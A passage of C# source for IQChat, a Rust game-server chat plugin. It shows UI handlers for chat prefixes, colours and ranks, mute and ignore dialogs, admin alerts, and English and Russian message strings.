                                    else Info.Settings.TurnAlert = true;

                                    DrawUI_IQChat_Update_Check_Box(player, Type, "143.38 -91.6", "151.38 -83.6", Info.Settings.TurnAlert);
                                    break;
                                }
                            case ElementsSettingsType.Sound:
                                {
                                    if (Info.Settings.TurnSound)
                                        Info.Settings.TurnSound = false;
                                    else Info.Settings.TurnSound = true;

                                    DrawUI_IQChat_Update_Check_Box(player, Type, "143.38 -103.6", "151.38 -95.6", Info.Settings.TurnSound);
                                    break;
                                }
                            default:
                                break;
                        }
                        break;
                    }
                case "droplist.controller":
                    {
                        String ActionDropList = arg.Args[1];
                        TakeElementUser Element = (TakeElementUser)Enum.Parse(typeof(TakeElementUser), arg.Args[2]);

                        switch (ActionDropList)
                        {
                            case "open":
                                {
                                    DrawUI_IQChat_OpenDropList(player, Element);
                                    break;
                                }
                            case "page.controller":
                                {
                                    String ActionDropListPage = arg.Args[3];
                                    Int32 Page = (Int32)Int32.Parse(arg.Args[4]);
                                    Page = ActionDropListPage == "+" ? Page + 1 : Page - 1;

                                    DrawUI_IQChat_OpenDropList(player, Element, Page);
                                    break;
                                }
                            case "element.take":
                                {
                                    Int32 Count = Int32.Parse(arg.Args[3]);
                                    String Permissions = arg.Args[4];
                                    String Argument = String.Join(" ", arg.Args.Skip(5));
                                    if (!permission.UserHasPermission(player.UserIDString, Permissions)) return;
                                    if (!UserInformation.ContainsKey(player.userID)) return;
                                    User User = UserInformation[player.userID];
                                    if (User == null) return;

                                    switch (Element)
                                    {
                                        case TakeElementUser.MultiPrefix:
                                            {
                                                if (!User.Info.PrefixList.Contains(Argument))
                                                {
                                                    User.Info.PrefixList.Add(Argument);
                                                    DrawUI_IQChat_OpenDropListArgument(player, Count);
                                                }
                                                else
                                                {
                                                    User.Info.PrefixList.Remove(Argument);
                                                    CuiHelper.DestroyUi(player, $"TAKED_INFO_{Count}");
                                                }
                                                break;
                                            }
                                        case TakeElementUser.Prefix:
                                            User.Info.Prefix = User.Info.Prefix.Equals(Argument) ? String.Empty : Argument;
                                            break;
                                        case TakeElementUser.Nick:
                                            User.Info.ColorNick = Argument;
                                            break;
                                        case TakeElementUser.Chat:
                                            User.Info.ColorMessage = Argument;
                                            break;
                                        case TakeElementUser.Rank:
                                            {
                                                User.Info.Rank = Argument;
                                                IQRankSetRank(player.userID, Argument);
                                            }
                                            break;
                                        default:
                                            break;
                                    }
                                    DrawUI_IQChat_Update_DisplayName(player);
                                    break;
                                }
                        }
                        break;
                    }
                case "slider.controller": // newui.cmd slider.controller 0 +
                    {
                        TakeElementUser Element = (TakeElementUser)Enum.Parse(typeof(TakeElementUser), arg.Args[1]);
                        List<Configuration.ControllerParameters.AdvancedFuncion> SliderElements = new List<Configuration.ControllerParameters.AdvancedFuncion>();
                        User Info = UserInformation[player.userID];
                        if (Info == null) return;

                        InformationOpenedUI InfoUI = LocalBase[player];
                        if (InfoUI == null) return;


                        String ActionSlide = arg.Args[2];

                        switch (Element)
                        {
                            case TakeElementUser.Prefix:
                                {
                                    SliderElements = LocalBase[player].ElementsPrefix;

                                    if (SliderElements == null || SliderElements.Count == 0) return;

                                    if (ActionSlide == "+")
                                    {
                                        InfoUI.SlideIndexPrefix++;
		   		 		  						  	   		  	  			  	  			  	   		  		  
                                        if (InfoUI.SlideIndexPrefix >= SliderElements.Count)
                                            InfoUI.SlideIndexPrefix = 0;
                                    }
                                    else
                                    {
                                        InfoUI.SlideIndexPrefix--;

                                        if (InfoUI.SlideIndexPrefix < 0)
                                            InfoUI.SlideIndexPrefix = SliderElements.Count - 1;
                                    }

                                    Info.Info.Prefix = SliderElements[InfoUI.SlideIndexPrefix].Argument;
                                }
                                break;
                            case TakeElementUser.Nick:
                                {
                                    SliderElements = LocalBase[player].ElementsNick;

                                    if (SliderElements == null || SliderElements.Count == 0) return;

                                    if (ActionSlide == "+")
                                    {
                                        InfoUI.SlideIndexNick++;

                                        if (InfoUI.SlideIndexNick >= SliderElements.Count)
                                            InfoUI.SlideIndexNick = 0;
                                    }
                                    else
                                    {
                                        InfoUI.SlideIndexNick--;
		   		 		  						  	   		  	  			  	  			  	   		  		  
                                        if (InfoUI.SlideIndexNick < 0)
                                            InfoUI.SlideIndexNick = SliderElements.Count - 1;
                                    }
                                    Info.Info.ColorNick = SliderElements[InfoUI.SlideIndexNick].Argument;
                                }
                                break;
                            case TakeElementUser.Chat:
                                {
                                    SliderElements = LocalBase[player].ElementsChat;
                                    if (SliderElements == null || SliderElements.Count == 0) return;

                                    if (ActionSlide == "+")
                                    {
                                        InfoUI.SlideIndexChat++;

                                        if (InfoUI.SlideIndexChat >= SliderElements.Count)
                                            InfoUI.SlideIndexChat = 0;
                                    }
                                    else
                                    {
                                        InfoUI.SlideIndexChat--;

                                        if (InfoUI.SlideIndexChat < 0)
                                            InfoUI.SlideIndexChat = SliderElements.Count - 1;
                                    }
                                    Info.Info.ColorMessage = SliderElements[InfoUI.SlideIndexChat].Argument;
                                }
                                break;
                            case TakeElementUser.Rank:
                                {
                                    SliderElements = LocalBase[player].ElementsRanks;
                                    if (SliderElements == null || SliderElements.Count == 0) return;

                                    if (ActionSlide == "+")
                                    {
                                        InfoUI.SlideIndexRank++;

                                        if (InfoUI.SlideIndexRank >= SliderElements.Count)
                                            InfoUI.SlideIndexRank = 0;
                                    }
                                    else
                                    {
                                        InfoUI.SlideIndexRank--;

                                        if (InfoUI.SlideIndexRank < 0)
                                            InfoUI.SlideIndexRank = SliderElements.Count - 1;
                                    }
                                    Info.Info.Rank = SliderElements[InfoUI.SlideIndexRank].Argument;
                                    IQRankSetRank(player.userID,SliderElements[InfoUI.SlideIndexRank].Argument);
                                }
                                break;
                            default:
                                break;
                        }
                        DrawUI_IQChat_Slider_Update_Argument(player, Element);
                        DrawUI_IQChat_Update_DisplayName(player);
                        break;
                    }
                default:
                    break;
            }
        }

        void ReplyBroadcast(String Message, String CustomPrefix = null, String CustomAvatar = null, Boolean AdminAlert = false)
        {
            foreach (BasePlayer p in !AdminAlert ? BasePlayer.activePlayerList.Where(p => UserInformation[p.userID].Settings.TurnBroadcast) : BasePlayer.activePlayerList)
                ReplySystem(p, Message, CustomPrefix, CustomAvatar);
        }
        
        
        private static Configuration config = new Configuration();
        [ChatCommand("adminalert")]
        private void AdminAlertChatCommand(BasePlayer Sender, String cmd, String[] args)
        {
            if (!permission.UserHasPermission(Sender.UserIDString, PermissionAlert)) return;
            Alert(Sender, args, true);
        }
        
        
                private void DrawUI_IQChat_Ignore_Alert(BasePlayer player, BasePlayer Target, UInt64 IDFake = 0)
        {
            String InterfacePanel = InterfaceBuilder.GetInterface("UI_Chat_Mute_And_Ignore_Alert_Panel");
            String Interface = InterfaceBuilder.GetInterface("UI_Chat_Ignore_Alert");
            if (Interface == null || InterfacePanel == null) return;

            GeneralInformation.RenameInfo Renamer = (IQFakeActive && Target == null && IDFake != 0)  ? null : GeneralInfo.GetInfoRename(Target.userID);
            String NickNamed = (IQFakeActive && Target == null && IDFake != 0)  ? FindFakeName(IDFake) : Renamer != null ? $"{Renamer.RenameNick ?? Target.displayName}" : Target.displayName;

            Interface = Interface.Replace("%TITLE%", GetLang(UserInformation[player.userID].Settings.IsIgnored((IQFakeActive && Target == null && IDFake != 0)  ? IDFake : Target.userID) ? "IQCHAT_TITLE_IGNORE_TITLES_UNLOCK" : "IQCHAT_TITLE_IGNORE_TITLES", player.UserIDString, NickNamed));
            Interface = Interface.Replace("%BUTTON_YES%", GetLang("IQCHAT_TITLE_IGNORE_BUTTON_YES", player.UserIDString));
            Interface = Interface.Replace("%BUTTON_NO%", GetLang("IQCHAT_TITLE_IGNORE_BUTTON_NO", player.UserIDString));
            Interface = Interface.Replace("%COMMAND%", $"newui.cmd action.mute.ignore ignore.and.mute.controller {SelectedAction.Ignore} confirm.yes {((IQFakeActive && Target == null && IDFake != 0)  ? IDFake : Target.userID)}");
            
            CuiHelper.DestroyUi(player, "MUTE_AND_IGNORE_PANEL_ALERT");
            CuiHelper.AddUi(player, InterfacePanel);
            CuiHelper.AddUi(player, Interface);
        }
        public Dictionary<UInt64, AntiNoob> UserInformationConnection = new Dictionary<UInt64, AntiNoob>();
        
        private String GetLastMessage(BasePlayer player, Int32 Count) 
        {
            String Messages = String.Empty;

            if (LastMessagesChat.ContainsKey(player))
            {
                foreach (String Message in LastMessagesChat[player].Skip(LastMessagesChat[player].Count - Count))
                    Messages += $"\n{Message}";
            }

            return Messages;
        }
        
                private void DrawUI_IQChat_Update_Check_Box(BasePlayer player, ElementsSettingsType Type, String OffsetMin, String OffsetMax, Boolean StatusCheckBox)
        {
            String Interface = InterfaceBuilder.GetInterface("UI_Chat_Context_CheckBox");
            User Info = UserInformation[player.userID];
            if (Info == null || Interface == null) return;
		   		 		  						  	   		  	  			  	  			  	   		  		  
            String Name = $"{Type}";
            Interface = Interface.Replace("%NAME_CHECK_BOX%", Name);
            Interface = Interface.Replace("%COLOR%", !StatusCheckBox ? "0.4716981 0.4716981 0.4716981 1" : "0.6040971 0.4198113 1 1");
            Interface = Interface.Replace("%OFFSET_MIN%", OffsetMin);
            Interface = Interface.Replace("%OFFSET_MAX%", OffsetMax);
            Interface = Interface.Replace("%COMMAND_TURNED%", $"newui.cmd checkbox.controller {Type}");

            CuiHelper.DestroyUi(player, Name);
            CuiHelper.AddUi(player, Interface);
        }
                
        
        object OnPlayerVoice(BasePlayer player, Byte[] data)
        {
            if (UserInformation[player.userID].MuteInfo.IsMute(MuteType.Voice))
                return false;
            return null;
        }
        [ConsoleCommand("saybro")]
        private void AlertOnlyPlayerConsoleCommand(ConsoleSystem.Arg args)
        {
            BasePlayer Sender = args.Player();
            if (Sender != null)
                if (!permission.UserHasPermission(Sender.UserIDString, PermissionAlert)) return;
                
            if (args.Args == null || args.Args.Length == 0)
            {
                if (Sender != null)
                    ReplySystem(Sender, LanguageEn ? "You didn't specify a player!" : "Вы не указали игрока!");
                else PrintWarning(LanguageEn ? "You didn't specify a player" : "Вы не указали игрока!");
                return;
            }
            BasePlayer Recipient = BasePlayer.Find(args.Args[0]);
            if (Recipient == null)
            {
                if (Sender != null)
                    ReplySystem(Sender, LanguageEn ? "The player is not on the server!" : "Игрока нет на сервере!");
                else PrintWarning(LanguageEn ? "The player is not on the server!" : "Игрока нет на сервере!");
                return;
            }
            Alert(Sender, Recipient, args.Args.Skip(1).ToArray());
        }
        class Response
        {
            [JsonProperty("country")]
            public string Country { get; set; }
        }

        [ConsoleCommand("online")]
        private void ShowPlayerOnlineConsole(ConsoleSystem.Arg arg)
        {
            BasePlayer player = arg.Player();
            List<String> PlayerNames = GetPlayersOnline();
            String Message = GetLang("IQCHAT_INFO_ONLINE", player != null ? player.UserIDString : null, String.Join($"\n", PlayerNames));

            if (player != null)
                player.ConsoleMessage(Message);
            else
            {
                String Pattern = @"</?size.*?>|</?color.*?>";
                String Messages = Regex.IsMatch(Message, Pattern) ? Regex.Replace(Message, Pattern, "") : Message;
                Puts(Messages);
            }
        }
        Boolean API_IS_IGNORED(UInt64 UserHas, UInt64 User)
        {
            if (!UserInformation.ContainsKey(UserHas)) return false;
            if (!UserInformation.ContainsKey(User)) return false;

            return UserInformation[UserHas].Settings.IsIgnored(User);
        }

        
                private bool OnPlayerChat(BasePlayer player, string message, Chat.ChatChannel channel)
        {
            if (Interface.Oxide.CallHook("CanChatMessage", player, message) != null) return false;

            SeparatorChat(channel, player, message);
            return false;
        }
		   		 		  						  	   		  	  			  	  			  	   		  		  
        
        
                private new void LoadDefaultMessages()
        {
            PrintWarning(LanguageEn ? "Language file is loading..." : "Языковой файл загружается...");
            lang.RegisterMessages(new Dictionary<string, string>
            {
                ["FUNC_MESSAGE_MUTE_CHAT"] = "{0} muted {1}\nDuration : {2}\nReason : {3}",
                ["FUNC_MESSAGE_UNMUTE_CHAT"] = "{0} unmuted {1}",
                ["FUNC_MESSAGE_MUTE_VOICE"] = "{0} muted voice to {1}\nDuration : {2}\nReason : {3}",
                ["FUNC_MESSAGE_UNMUTE_VOICE"] = "{0} unmuted voice to {1}",
                ["FUNC_MESSAGE_MUTE_ALL_CHAT"] = "Chat disabled",
                ["FUNC_MESSAGE_UNMUTE_ALL_CHAT"] = "Chat enabled",
                ["FUNC_MESSAGE_MUTE_ALL_VOICE"] = "Voice chat disabled",
                ["FUNC_MESSAGE_UNMUTE_ALL_VOICE"] = "Voice chat enabled",
                ["FUNC_MESSAGE_MUTE_ALL_ALERT"] = "Blocking by Administrator",
                ["FUNC_MESSAGE_PM_TURN_FALSE"] = "The player has forbidden to send himself private messages",
                ["FUNC_MESSAGE_ALERT_TURN_FALSE"] = "The player has not been allowed to notify himself",
		   		 		  						  	   		  	  			  	  			  	   		  		  
                ["FUNC_MESSAGE_NO_ARG_BROADCAST"] = "You can not send an empty broadcast message!",

                ["UI_ALERT_TITLE"] = "<size=14><b>Notification</b></size>",
                
                ["COMMAND_NOT_PERMISSION"] = "You dont have permissions to use this command",
                ["COMMAND_RENAME_NOTARG"] = "For rename use : /rename [NewNickname] [NewID (Optional)]",
                ["COMMAND_RENAME_NOT_ID"] = "Incorrect ID for renaming! Use Steam64ID or leave blank",
                ["COMMAND_RENAME_SUCCES"] = "You have successfully changed your nickname!\nyour nickname : {0}\nYour ID : {1}",

                ["COMMAND_PM_NOTARG"] = "To send pm use : /pm Nickname Message",
                ["COMMAND_PM_NOT_NULL_MSG"] = "Message is empty!",
                ["COMMAND_PM_NOT_USER"] = "User not found or offline",
                ["COMMAND_PM_SUCCESS"] = "Your private message sent successful\nMessage : {0}\nDelivered : {1}",
                ["COMMAND_PM_SEND_MSG"] = "Message from {0}\n{1}",

                ["COMMAND_R_NOTARG"] = "For reply use : /r Message",
                ["COMMAND_R_NOTMSG"] = "You dont have any private conversations yet!",

                ["FLOODERS_MESSAGE"] = "You're typing too fast! Please Wait {0} seconds",

                ["PREFIX_SETUP"] = "You have successfully removed the prefix {0}, it is already activated and installed",
                ["COLOR_CHAT_SETUP"] = "You have successfully picked up the <color={0}>chat color</color>, it is already activated and installed",
                ["COLOR_NICK_SETUP"] = "You have successfully taken the <color={0}>nickname color</color>, it is already activated and installed",

                ["PREFIX_RETURNRED"] = "Your prefix {0} expired, it was reset automatically",
                ["COLOR_CHAT_RETURNRED"] = "Action of your <color={0}>color chat</color> over, it is reset automatically",
                ["COLOR_NICK_RETURNRED"] = "Action of your <color={0}>color nick</color> over, it is reset automatically",

                ["WELCOME_PLAYER"] = "{0} came online",
                ["LEAVE_PLAYER"] = "{0} left",
                ["WELCOME_PLAYER_WORLD"] = "{0} came online. Country: {1}",
                ["LEAVE_PLAYER_REASON"] = "{0} left. Reason: {1}",

                ["IGNORE_ON_PLAYER"] = "You added {0} in black list",
                ["IGNORE_OFF_PLAYER"] = "You removed {0} from black list",
                ["IGNORE_NO_PM"] = "This player added you in black list. Your message has not been delivered.",
                ["IGNORE_NO_PM_ME"] = "You added this player in black list. Your message has not been delivered.",
                ["INGORE_NOTARG"] = "To ignore a player use : /ignore nickname",

                ["DISCORD_SEND_LOG_CHAT"] = "Player : {0}({1})\nFiltred message : {2}\nMessage : {3}",
                ["DISCORD_SEND_LOG_MUTE"] = "{0}({1}) give mute chat\nSuspect : {2}({3})\nReason : {4}",

                ["TITLE_FORMAT_DAYS"] = "D",
                ["TITLE_FORMAT_HOURSE"] = "H",
                ["TITLE_FORMAT_MINUTES"] = "M",
                ["TITLE_FORMAT_SECONDS"] = "S",

                ["IQCHAT_CONTEXT_TITLE"] = "SETTING UP A CHAT", ///"%TITLE%"
                ["IQCHAT_CONTEXT_SETTING_ELEMENT_TITLE"] = "CUSTOM SETTING", ///"%SETTING_ELEMENT%"
                ["IQCHAT_CONTEXT_INFORMATION_TITLE"] = "INFORMATION", ///"%INFORMATION%"
                ["IQCHAT_CONTEXT_SETTINGS_TITLE"] = "SETTINGS", ///"%SETTINGS%"
                ["IQCHAT_CONTEXT_SETTINGS_PM_TITLE"] = "Private messages", ///"%SETTINGS_PM%"
                ["IQCHAT_CONTEXT_SETTINGS_ALERT_TITLE"] = "Notification in the chat", ///"%SETTINGS_ALERT%"
                ["IQCHAT_CONTEXT_SETTINGS_ALERT_PM_TITLE"] = "Mention in the chat", ///"%SETTINGS_ALERT_PM%"
                ["IQCHAT_CONTEXT_SETTINGS_SOUNDS_TITLE"] = "Sound notification", ///"%SETTINGS_SOUNDS%"
                ["IQCHAT_CONTEXT_MUTE_STATUS_NOT"] = "NO", ///"%MUTE_STATUS_PLAYER%"
                ["IQCHAT_CONTEXT_MUTE_STATUS_TITLE"] = "Blocking the chat", ///"%MUTE_STATUS_TITLE%"
                ["IQCHAT_CONTEXT_IGNORED_STATUS_COUNT"] = "<size=11>{0}</size> human (а)", ///"%IGNORED_STATUS_COUNT%"
                ["IQCHAT_CONTEXT_IGNORED_STATUS_TITLE"] = "Ignoring", ///"%IGNORED_STATUS_TITLE%"
                ["IQCHAT_CONTEXT_NICK_DISPLAY_TITLE"] = "Your nickname", ///"%NICK_DISPLAY_TITLE%"
                ["IQCHAT_CONTEXT_NICK_DISPLAY_MESSAGE"] = "i love iqchat",
                ["IQCHAT_CONTEXT_SLIDER_PREFIX_TITLE"] = "Prefix", /// %SLIDER_PREFIX_TITLE%
                ["IQCHAT_CONTEXT_SLIDER_NICK_COLOR_TITLE"] = "Nick", /// %SLIDER_NICK_COLOR_TITLE%
                ["IQCHAT_CONTEXT_SLIDER_MESSAGE_COLOR_TITLE"] = "Message", /// %SLIDER_MESSAGE_COLOR_TITLE%
                ["IQCHAT_CONTEXT_SLIDER_IQRANK_TITLE"] = "Rank",
                ["IQCHAT_CONTEXT_SLIDER_IQRANK_TITLE_NULLER"] = "Absent",
                ["IQCHAT_CONTEXT_SLIDER_PREFIX_TITLE_DESCRIPTION"] = "Choosing a prefix", /// 
                ["IQCHAT_CONTEXT_SLIDER_CHAT_NICK_TITLE_DESCRIPTION"] = "Choosing a nickname color", /// 
                ["IQCHAT_CONTEXT_SLIDER_CHAT_MESSAGE_TITLE_DESCRIPTION"] = "Chat Color Selection", /// 
                ["IQCHAT_CONTEXT_SLIDER_IQRANK_TITLE_DESCRIPTION"] = "Rank Selection", /// 
                ["IQCHAT_CONTEXT_DESCRIPTION_PREFIX"] = "Prefix Setting",
                ["IQCHAT_CONTEXT_DESCRIPTION_NICK"] = "Setting up a nickname",
                ["IQCHAT_CONTEXT_DESCRIPTION_CHAT"] = "Setting up a message",
                ["IQCHAT_CONTEXT_DESCRIPTION_RANK"] = "Setting up the rank",

                ["IQCHAT_ALERT_TITLE"] = "ALERT", /// %TITLE_ALERT%

                ["IQCHAT_TITLE_IGNORE_AND_MUTE_MUTED"] = "LOCK MANAGEMENT", 
                ["IQCHAT_TITLE_IGNORE_AND_MUTE_IGNORED"] = "IGNORING MANAGEMENT",
                ["IQCHAT_TITLE_IGNORE_TITLES"] = "<b>DO YOU REALLY WANT TO IGNORE\n{0}?</b>",
                ["IQCHAT_TITLE_IGNORE_TITLES_UNLOCK"] = "<b>DO YOU WANT TO REMOVE THE IGNORING FROM THE PLAYER\n{0}?</b>",
                ["IQCHAT_TITLE_IGNORE_BUTTON_YES"] = "<b>YES, I WANT TO</b>",
                ["IQCHAT_TITLE_IGNORE_BUTTON_NO"] = "<b>NO, I CHANGED MY MIND</b>",
                ["IQCHAT_TITLE_MODERATION_PANEL"] = "MODERATOR PANEL",

                ["IQCHAT_BUTTON_MODERATION_MUTE_MENU"] = "Lock Management",
                ["IQCHAT_BUTTON_MODERATION_MUTE_MENU_TITLE_ALERT"] = "SELECT AN ACTION",
                ["IQCHAT_BUTTON_MODERATION_MUTE_MENU_TITLE_ALERT_REASON"] = "SELECT THE REASON FOR BLOCKING",
                ["IQCHAT_BUTTON_MODERATION_MUTE_MENU_TITLE_ALERT_CHAT"] = "Block chat",
                ["IQCHAT_BUTTON_MODERATION_MUTE_MENU_TITLE_ALERT_VOICE"] = "Block voice",
                ["IQCHAT_BUTTON_MODERATION_UNMUTE_MENU_TITLE_ALERT_CHAT"] = "Unblock chat",
                ["IQCHAT_BUTTON_MODERATION_UNMUTE_MENU_TITLE_ALERT_VOICE"] = "Unlock voice",
                ["IQCHAT_BUTTON_MODERATION_MUTE_ALL_CHAT"] = "Block all chat",
                ["IQCHAT_BUTTON_MODERATION_UNMUTE_ALL_CHAT"] = "Unblock all chat",
                ["IQCHAT_BUTTON_MODERATION_MUTE_ALL_VOICE"] = "Block everyone's voice",
                ["IQCHAT_BUTTON_MODERATION_UNMUTE_ALL_VOICE"] = "Unlock everyone's voice",

                ["IQCHAT_FUNCED_NO_SEND_CHAT_MUTED"] = "You have an active chat lock : {0}",
                ["IQCHAT_FUNCED_NO_SEND_CHAT_MUTED_ALL_CHAT"] = "The administrator blocked everyone's chat. Expect full unblocking",
                ["IQCHAT_FUNCED_NO_SEND_CHAT_MUTED_ALL_VOICE"] = "The administrator blocked everyone's voice chat. Expect full unblocking",
                ["IQCHAT_FUNCED_NO_SEND_CHAT_UMMUTED_ALL_VOICE"] = "The administrator has unblocked the voice chat for everyone",
                ["IQCHAT_FUNCED_NO_SEND_CHAT_UNMUTED_ALL_CHAT"] = "The administrator has unblocked the chat for everyone",

                ["IQCHAT_FUNCED_ALERT_TITLE"] = "<color=#a7f64f><b>[MENTION]</b></color>",
                ["IQCHAT_FUNCED_ALERT_TITLE_ISMUTED"] = "The player has already been muted!",
                ["IQCHAT_FUNCED_ALERT_TITLE_SERVER"] = "Administrator",

                ["IQCHAT_INFO_ONLINE"] = "Now on the server :\n{0}",

                ["IQCHAT_INFO_ANTI_NOOB"] = "You first connected to the server!\nPlay some more {0}\nTo get access to send messages to the global and team chat!",
                ["IQCHAT_INFO_ANTI_NOOB_PM"] = "You first connected to the server!\nPlay some more {0}\nTo access sending messages to private messages!",

                ["XLEVELS_SYNTAX_PREFIX"] = "[{0} Level]",
                ["CLANS_SYNTAX_PREFIX"] = "[{0}]",

            }, this);

            lang.RegisterMessages(new Dictionary<string, string>
            {
                ["FUNC_MESSAGE_MUTE_CHAT"] = "{0} заблокировал чат игроку {1}\nДлительность : {2}\nПричина : {3}",
                ["FUNC_MESSAGE_UNMUTE_CHAT"] = "{0} разблокировал чат игроку {1}",
                ["FUNC_MESSAGE_MUTE_VOICE"] = "{0} заблокировал голос игроку {1}\nДлительность : {2}\nПричина : {3}",
                ["FUNC_MESSAGE_UNMUTE_VOICE"] = "{0} разблокировал голос игроку {1}",
                ["FUNC_MESSAGE_MUTE_ALL_CHAT"] = "Всем игрокам был заблокирован чат",
                ["FUNC_MESSAGE_UNMUTE_ALL_CHAT"] = "Всем игрокам был разблокирован чат",
                ["FUNC_MESSAGE_MUTE_ALL_VOICE"] = "Всем игрокам был заблокирован голос",
                ["FUNC_MESSAGE_MUTE_ALL_ALERT"] = "Блокировка Администратором",
                ["FUNC_MESSAGE_UNMUTE_ALL_VOICE"] = "Всем игрокам был разблокирован голос",

                ["FUNC_MESSAGE_PM_TURN_FALSE"] = "Игрок запретил присылать себе личные сообщения",
                ["FUNC_MESSAGE_ALERT_TURN_FALSE"] = "Игрок запретил уведомлять себя",

                ["FUNC_MESSAGE_NO_ARG_BROADCAST"] = "Вы не можете отправлять пустое сообщение в оповещение!",
		   		 		  						  	   		  	  			  	  			  	   		  		  
                ["UI_ALERT_TITLE"] = "<size=14><b>Уведомление</b></size>",

                ["COMMAND_NOT_PERMISSION"] = "У вас недостаточно прав для данной команды",
                ["COMMAND_RENAME_NOTARG"] = "Используйте команду так : /rename [НовыйНик] [НовыйID (По желанию)]",
                ["COMMAND_RENAME_NOT_ID"] = "Неверно указан ID для переименования! Используйте Steam64ID, либо оставьте поле пустым",
                ["COMMAND_RENAME_SUCCES"] = "Вы успешно изменили ник!\nВаш ник : {0}\nВаш ID : {1}",

                ["COMMAND_PM_NOTARG"] = "Используйте команду так : /pm Ник Игрока Сообщение",
                ["COMMAND_PM_NOT_NULL_MSG"] = "Вы не можете отправлять пустое сообщение",
                ["COMMAND_PM_NOT_USER"] = "Игрок не найден или не в сети",
                ["COMMAND_PM_SUCCESS"] = "Ваше сообщение успешно доставлено\nСообщение : {0}\nДоставлено : {1}",
                ["COMMAND_PM_SEND_MSG"] = "Сообщение от {0}\n{1}",

                ["COMMAND_R_NOTARG"] = "Используйте команду так : /r Сообщение",
                ["COMMAND_R_NOTMSG"] = "Вам или вы ещё не писали игроку в личные сообщения!",

                ["FLOODERS_MESSAGE"] = "Вы пишите слишком быстро! Подождите {0} секунд",

                ["PREFIX_SETUP"] = "Вы успешно забрали префикс {0}, он уже активирован и установлен",
                ["COLOR_CHAT_SETUP"] = "Вы успешно забрали <color={0}>цвет чата</color>, он уже активирован и установлен",
                ["COLOR_NICK_SETUP"] = "Вы успешно забрали <color={0}>цвет ника</color>, он уже активирован и установлен",

                ["PREFIX_RETURNRED"] = "Действие вашего префикса {0} окончено, он сброшен автоматически",
                ["COLOR_CHAT_RETURNRED"] = "Действие вашего <color={0}>цвета чата</color> окончено, он сброшен автоматически",
                ["COLOR_NICK_RETURNRED"] = "Действие вашего <color={0}>цвет ника</color> окончено, он сброшен автоматически",

                ["WELCOME_PLAYER"] = "{0} зашел на сервер",
                ["LEAVE_PLAYER"] = "{0} вышел с сервера",
                ["WELCOME_PLAYER_WORLD"] = "{0} зашел на сервер.Из {1}",
                ["LEAVE_PLAYER_REASON"] = "{0} вышел с сервера.Причина {1}",
		   		 		  						  	   		  	  			  	  			  	   		  		  
                ["IGNORE_ON_PLAYER"] = "Вы добавили игрока {0} в черный список",
                ["IGNORE_OFF_PLAYER"] = "Вы убрали игрока {0} из черного списка",
                ["IGNORE_NO_PM"] = "Данный игрок добавил вас в ЧС,ваше сообщение не будет доставлено",
                ["IGNORE_NO_PM_ME"] = "Вы добавили данного игрока в ЧС,ваше сообщение не будет доставлено",
                ["INGORE_NOTARG"] = "Используйте команду так : /ignore Ник Игрока",

                ["DISCORD_SEND_LOG_CHAT"] = "Игрок : {0}({1})\nФильтрованное сообщение : {2}\nИзначальное сообщение : {3}",
                ["DISCORD_SEND_LOG_MUTE"] = "{0}({1}) выдал блокировку чата\nИгрок : {2}({3})\nПричина : {4}",

                ["TITLE_FORMAT_DAYS"] = "Д",
                ["TITLE_FORMAT_HOURSE"] = "Ч",
                ["TITLE_FORMAT_MINUTES"] = "М",
                ["TITLE_FORMAT_SECONDS"] = "С",

                ["IQCHAT_CONTEXT_TITLE"] = "НАСТРОЙКА ЧАТА", ///"%TITLE%"
                ["IQCHAT_CONTEXT_SETTING_ELEMENT_TITLE"] = "ПОЛЬЗОВАТЕЛЬСКАЯ НАСТРОЙКА", ///"%SETTING_ELEMENT%"
                ["IQCHAT_CONTEXT_INFORMATION_TITLE"] = "ИНФОРМАЦИЯ", ///"%INFORMATION%"
                ["IQCHAT_CONTEXT_SETTINGS_TITLE"] = "НАСТРОЙКИ", ///"%SETTINGS%"
                ["IQCHAT_CONTEXT_SETTINGS_PM_TITLE"] = "Личные сообщения", ///"%SETTINGS_PM%"
                ["IQCHAT_CONTEXT_SETTINGS_ALERT_TITLE"] = "Оповещение в чате", ///"%SETTINGS_ALERT%"
                ["IQCHAT_CONTEXT_SETTINGS_ALERT_PM_TITLE"] = "Упоминание в чате", ///"%SETTINGS_ALERT_PM%"
                ["IQCHAT_CONTEXT_SETTINGS_SOUNDS_TITLE"] = "Звуковое оповещение", ///"%SETTINGS_SOUNDS%"
                ["IQCHAT_CONTEXT_MUTE_STATUS_NOT"] = "НЕТ", ///"%MUTE_STATUS_PLAYER%"
                ["IQCHAT_CONTEXT_MUTE_STATUS_TITLE"] = "Блокировка чата", ///"%MUTE_STATUS_TITLE%"
                ["IQCHAT_CONTEXT_IGNORED_STATUS_COUNT"] = "<size=11>{0}</size> человек (а)", ///"%IGNORED_STATUS_COUNT%"
                ["IQCHAT_CONTEXT_IGNORED_STATUS_TITLE"] = "Игнорирование", ///"%IGNORED_STATUS_TITLE%"
                ["IQCHAT_CONTEXT_NICK_DISPLAY_TITLE"] = "Ваш ник", ///"%NICK_DISPLAY_TITLE%"
                ["IQCHAT_CONTEXT_NICK_DISPLAY_MESSAGE"] = "люблю iqchat", 
                ["IQCHAT_CONTEXT_SLIDER_PREFIX_TITLE"] = "Префикс", /// %SLIDER_PREFIX_TITLE%
                ["IQCHAT_CONTEXT_SLIDER_NICK_COLOR_TITLE"] = "Ник", /// %SLIDER_NICK_COLOR_TITLE%
                ["IQCHAT_CONTEXT_SLIDER_MESSAGE_COLOR_TITLE"] = "Чат", /// %SLIDER_MESSAGE_COLOR_TITLE%
                ["IQCHAT_CONTEXT_SLIDER_IQRANK_TITLE"] = "Ранг",
                ["IQCHAT_CONTEXT_SLIDER_IQRANK_TITLE_NULLER"] = "Отсутствует",
                ["IQCHAT_CONTEXT_SLIDER_PREFIX_TITLE_DESCRIPTION"] = "Выбор префикса", /// 
                ["IQCHAT_CONTEXT_SLIDER_CHAT_NICK_TITLE_DESCRIPTION"] = "Выбор цвета ника", /// 
                ["IQCHAT_CONTEXT_SLIDER_CHAT_MESSAGE_TITLE_DESCRIPTION"] = "Выбор цвета чата", /// 
                ["IQCHAT_CONTEXT_SLIDER_IQRANK_TITLE_DESCRIPTION"] = "Выбор ранга", /// 
                ["IQCHAT_CONTEXT_DESCRIPTION_PREFIX"] = "Настройка префикса", 
                ["IQCHAT_CONTEXT_DESCRIPTION_NICK"] = "Настройка ника", 
                ["IQCHAT_CONTEXT_DESCRIPTION_CHAT"] = "Настройка сообщения",
                ["IQCHAT_CONTEXT_DESCRIPTION_RANK"] = "Настройка ранга",


                ["IQCHAT_ALERT_TITLE"] = "УВЕДОМЛЕНИЕ", /// %TITLE_ALERT%
